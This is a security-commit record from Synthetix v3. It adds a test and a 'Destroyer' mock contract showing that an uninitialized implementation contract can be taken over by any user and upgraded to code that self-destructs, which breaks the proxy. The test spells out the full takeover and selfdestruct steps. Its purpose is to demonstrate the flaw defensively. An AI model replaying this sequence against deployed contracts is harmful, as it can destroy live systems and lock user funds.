# [?] Added a test that shows the upgrade vulnerability

## Summary
Severity: Unknown
Chain: Synthetix
Component: Synthetixio/synthetix-v3
Published: 2021-09-20
Source: https://github.com/Synthetixio/synthetix-v3/commit/bdfca70e4e2c7d00c5d3f98bc05c8f625423822a
Type: security-commit

## Details
Added a test that shows the upgrade vulnerability

## Patch
### packages/deployer/test/sample-project/contracts/mocks/Destroyer.sol
```diff
@@ -0,0 +1,16 @@
+//SPDX-License-Identifier: Unlicense
+pragma solidity ^0.8.0;
+
+import "../storage/ProxyNamespace.sol";
+
+
+contract Destroyer is ProxyNamespace {
+    modifier postExecutor() {
+        _;
+        selfdestruct(payable(0));
+    }
+
+    function upgradeTo(address) public postExecutor {
+        _proxyStorage().implementation = address(0);
+    }
+}
```

### packages/deployer/test/sample-project/test/UpgradeModule.test.js
```diff
@@ -9,10 +9,10 @@ const { findEvent } = require('@synthetixio/core-js/utils/events');
 describe('UpgradeModule', () => {
   bootstrap();
 
-  let UpgradeModule;
+  let UpgradeModule, OwnerModule;
 
   let owner, user;
-  let routerAddress;
+  let proxyAddress, routerAddress;
 
   before('identify signers', async () => {
     [owner, user] = await ethers.getSigners();
@@ -24,9 +24,10 @@ describe('UpgradeModule', () => {
 
   before('identify modules', async () => {
     routerAddress = getRouterAddress();
-    const proxyAddress = getProxyAddress();
+    proxyAddress = getProxyAddress();
 
     UpgradeModule = await ethers.getContractAt('UpgradeModule', proxyAddress);
+    OwnerModule = await ethers.getContractAt('OwnerModule', proxyAddress);
   });
 
   describe('when the system is deployed', () => {
@@ -80,4 +81,66 @@ describe('UpgradeModule', () => {
       assert.equal(await UpgradeModule.getImplementation(), routerAddress);
     });
   });
+
+  describe('when attempting to destroy the implementation with a malicious contract', () => {
+    let destroyer;
+
+    let OwnerModuleImpl, UpgradeModuleImpl;
+
+    before('deploy the malicious contract', async () => {
+      const factory = await ethers.getContractFactory('Destroyer');
+      destroyer = await factory.deploy();
+    });
+
+    before('identify implementation modules', async () => {
+      OwnerModuleImpl = await ethers.getContractAt('OwnerModule', routerAddress);
+      UpgradeModuleImpl = await ethers.getContractAt('UpgradeModule', routerAddress);
+    });
+
+    it('shows that the owner of the implementation is address(0)', async () => {
+      assert.equal(await OwnerModuleImpl.getOwner(), '0x0000000000000000000000000000000000000000');
+    });
+
+    it('shows that the implementation of the implementation is address(0)', async () => {
+      assert.equal(await UpgradeModuleImpl.getImplementation(), '0x0000000000000000000000000000000000000000');
+    });
+
+    describe('when owning the implementation', () => {
+      before('own the implementation', async function() {
+        let tx;
+
+        tx = await OwnerModuleImpl.connect(user).nominateOwner(user.address);
+        await tx.wait();
+
+        tx = await OwnerModuleImpl.connect(user).acceptOwnership();
+        await tx.wait();
+      });
+
+      it('shows that the user is now the owner of the implementation', async () => {
+        assert.equal(await OwnerModuleImpl.getOwner(), user.address);
+      });
+
+      describe('when upgrading the implementation of the implementation to the destroyer', () => {
+        before('upgrade the implementation', async () => {
+          const tx = await UpgradeModuleImpl.connect(user).upgradeTo(destroyer.address);
+          await tx.wait();
+        });
+
+        it('shows that the code of the implementation is null', async () => {
+          const code = await ethers.provider.getCode(routerAddress);
+
+          assert.equal(code, '0x');
+        });
+
+        describe('when trying to read the owner from the proxy', () => {
+          it('reverts', async () => {
+            await assertRevert(
+              OwnerModule.getOwner(),
+              'call revert exception'
+            );
+          });
+        });
+      });
+    });
+  });
 });
```
